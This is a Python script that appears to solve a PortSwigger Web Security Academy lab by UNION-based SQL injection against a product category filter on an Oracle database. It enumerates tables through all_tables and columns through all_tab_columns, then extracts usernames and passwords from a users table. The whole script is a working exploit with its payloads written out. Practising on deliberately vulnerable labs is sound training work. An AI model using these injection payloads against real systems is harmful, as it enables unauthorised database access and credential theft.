import requests
from bs4 import BeautifulSoup

url = "https://0ac2004d04e4e8098098033e00c500b1.web-security-academy.net/filter?category="
sqliForTable = "' UNION SELECT table_name, NULL FROM all_tables--"

responseForTable = requests.get(url=(url + sqliForTable)).text
soupForTable = BeautifulSoup(responseForTable, "html.parser")

tables = soupForTable.find_all("th")
for table in tables:
    sqliToGetColumn = f"' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = '{table.text}'--"
    print("Found table: " + table.text)
    print("Inside table: " + table.text)
    responseColumn = requests.get(url=(url + sqliToGetColumn)).text
    soupForColumn = BeautifulSoup(responseColumn, 'html.parser')
    columns = soupForColumn.find_all("th")
    for column in columns:
        print("Column: " + column.text)
    print("--------------------")

tableToRetrive = "USERS_PMOQQC"
usernameColumn = "USERNAME_HMCGGI"
passwordColumn = "PASSWORD_RPVNDO"
sqliToGetData = f"' UNION SELECT {usernameColumn}, {passwordColumn} FROM {tableToRetrive}--"

responseData = requests.get(url=(url + sqliToGetData)).text
soupForData = BeautifulSoup(responseData, 'html.parser')
usernameInfo = soupForData.find_all("th")
passwordInfo = soupForData.find_all("td")
for i, j  in zip(usernameInfo, passwordInfo):
    print("Username: " + i.text)
    print("Password: " + j.text)

print("Please login to solve the lab!")